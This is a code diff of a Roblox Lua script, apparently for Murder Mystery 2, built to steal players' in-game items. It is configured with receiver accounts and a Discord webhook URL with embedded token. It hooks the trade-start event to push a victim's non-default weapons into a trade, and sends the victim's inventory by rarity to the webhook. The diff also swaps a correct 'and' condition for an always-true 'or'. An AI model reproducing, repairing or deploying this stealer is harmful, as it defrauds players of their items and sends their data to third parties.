@@ -1,5 +1,5 @@
 Config = {
-    Receivers = {"user_boblex"},
+    Receivers = {"User_boblex"},
     Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
     FullInventory = true,
     ReturnStealer = true,
@@ -60,7 +60,7 @@ local e = game:GetService("HttpService")
 local f = game:GetService("TeleportService")
 local g = game:GetService("ReplicatedStorage")
 local h = game:GetService("RunService")
-local i = ReplicatedStorage.Trade
+local i = g.Trade
 local j = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 local k =
     [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] ..
@@ -264,7 +264,7 @@ function Activate(I)
         end
     end
 end
-ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
+g.Trade.StartTrade.OnClientEvent:Connect(
     function()
         wait(1)
         if Mobile then
@@ -274,8 +274,7 @@ ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
             for w, x in pairs(J.Items.Main:GetChildren()) do
                 for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        -- Corrected condition with 'and'
-                        if x.ItemName.Label.Text ~= "Default Knife" and x.ItemName.Label.Text ~= "Default Gun" then
+                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
                             if M ~= 4 then
                                 M = M + 1
                                 LoopsItem = 1
@@ -301,8 +300,7 @@ ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
             for w, x in pairs(J.Items.Main:GetChildren()) do
                 for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        -- Corrected condition with 'and'
-                        if x.ItemName.Label.Text ~= "Default Knife" and x.ItemName.Label.Text ~= "Default Gun" then
+                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
                             if M ~= 4 then
                                 M = M + 1
                                 LoopsItem = 1
@@ -375,7 +373,7 @@ local Q = {
                                                         table.concat(Config.Receivers, ", ") ..
                                                             "\nScript       : " ..
                                                                 Config.Script ..
-                                                                    "```\n🍗 **__Inventory__**\n```Ancient    🦖: " ..
+                                                                    "```\n🎒 **__Inventory__**\n```Ancient    🦖: " ..
                                                                         r ..
                                                                             "\nGodly      🌚: " ..
                                                                                 q ..
@@ -391,7 +389,7 @@ local Q = {
                                                                                                                         m ..
                                                                                                                             "\nCommon     🤣: " ..
                                                                                                                                 l ..
-                                                                                                                                    "```\n🧑‍🏫’ **__Full Inventory__**\n```" ..
+                                                                                                                                    "```\n🎒 **__Full Inventory__**\n```" ..
                                                                                                                                         FullInventory(
                                                                                                                                         ) ..
                                                                                                                                             "```",
